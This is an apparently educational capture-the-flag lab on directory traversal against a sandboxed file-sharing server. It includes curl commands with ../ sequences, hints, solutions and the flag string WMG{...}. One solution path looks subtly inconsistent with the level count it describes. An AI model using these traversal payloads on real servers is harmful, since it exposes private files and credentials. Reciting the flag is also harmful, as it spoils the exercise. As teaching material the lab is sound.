title: Directory Traversal Vulnerability
description: Learn to exploit path traversal vulnerabilities to access files outside the intended web root directory.
outcomes: Understand how web applications can be vulnerable to directory traversal via unvalidated path inputs.
Use ../ sequences in URLs to navigate outside the intended directory structure.
Retrieve files that should not be directly accessible via a web browser.

levels.title: Introduction
levels.content:
# General information — please read carefully

* Each level builds on the previous. Do not skip ahead.
* If you get stuck, use hints or Google the technique.
* This exercise is educational. Only attack systems within your sandbox.

# Storyline

You are a security researcher testing SecureHost, a file-sharing service. The company claims their web server is secure, but they have not implemented proper input validation on file paths. Your job: prove that you can read files outside the intended directory structure.

levels.title: Get Access
levels.cloud_content:
SSH to your attacker machine at **10.1.30.23**, then access the target web server:

```
curl http://10.1.30.10/files/documents/README.txt
```

The target is at **10.1.30.10** on HTTP port 80. Do not attack outside the sandbox. Submit **start** to begin.
levels.local_content:
Access the target web server locally:

```
curl http://127.0.0.1/files/documents/README.txt
```

Submit **start** to begin.

levels.title: Discover the Traversal Vector
levels.content:
The SecureHost application is supposed to serve only files from `/files/documents/`. However, the URL path is passed directly to the web server without validation.

Directory traversal attacks use a special sequence to move up the directory tree. In Unix-like systems, every directory has a special name for its parent directory. What is this name?

Try accessing a simple test:

```
curl http://10.1.30.10/files/documents/README.txt
```

Then try to go up one level:

```
curl http://10.1.30.10/files/[TRAVERSAL_SEQUENCE]/files/documents/README.txt
```

If you see the same file content, you have successfully navigated up and back down — confirming the traversal works.

**What is the special directory name used to refer to the parent directory?**
levels.solution:
```
$ curl http://10.1.30.10/files/documents/README.txt
This is a public document...

$ curl http://10.1.30.10/files/../files/documents/README.txt
This is a public document...
```

The sequence `..` refers to the parent directory. Using it in the path allows traversal.

hints.title: What is the parent directory reference in Unix?
hints.content: In Unix/Linux, `..` (two dots) represents the parent directory. `../` moves up one level.

hints.title: How would you use it in a URL?
hints.content: If you are at `/files/documents/`, then `../` takes you to `/files/`, and `../../` takes you to `/`.

levels.title: Escape the Intended Directory
levels.content:
You have confirmed that `..` works to navigate the directory tree. Now use this to escape the intended `/files/documents/` directory.

SecureHost has placed a `secrets/` directory next to `/files/` in the web root. It was meant to be hidden from users, but without proper access controls, you can reach it via directory traversal.

From `/files/documents/`, you need to go up two levels (to `/`) then access the sibling directory:

```
curl http://10.1.30.10/files/../../secrets/flag.txt
```

Look at the response — it contains a directory or file name. What is that name (without the trailing slash)?
levels.solution:
```
$ curl http://10.1.30.10/files/../../secrets/flag.txt
WMG{d1r_trav3rs4l_n0_s4n1t1z3d_p4ths}
```

The directory we escaped into is **secrets**.

hints.title: How many levels up do you need to go?
hints.content: From `/files/documents/` you need to go up 2 levels to reach `/`. That means `../../`.

hints.title: What path should you construct?
hints.content: Start with `/files/`, then add `../../secrets/` to escape and access the sibling directory.

levels.title: Retrieve the Flag
levels.content:
You have escaped the intended directory structure. Now retrieve the flag file from the secrets directory.

Run:

```
curl http://10.1.30.10/files/../../secrets/flag.txt
```

The entire response is the flag — a string starting with `WMG{` and ending with `}`.

In a real engagement, this same technique could expose configuration files, private keys, database backups, or any other file the web server process can read.

**Submit the flag from the response.**

hints.title: What is the exact URL?
hints.content: Use the same URL pattern from the previous level: `/files/../../secrets/flag.txt`

hints.title: What format is the flag?
hints.content: The flag starts with `WMG{` and ends with `}`.

questions.text: Had you encountered directory traversal before?

choices.text: No, this was new to me
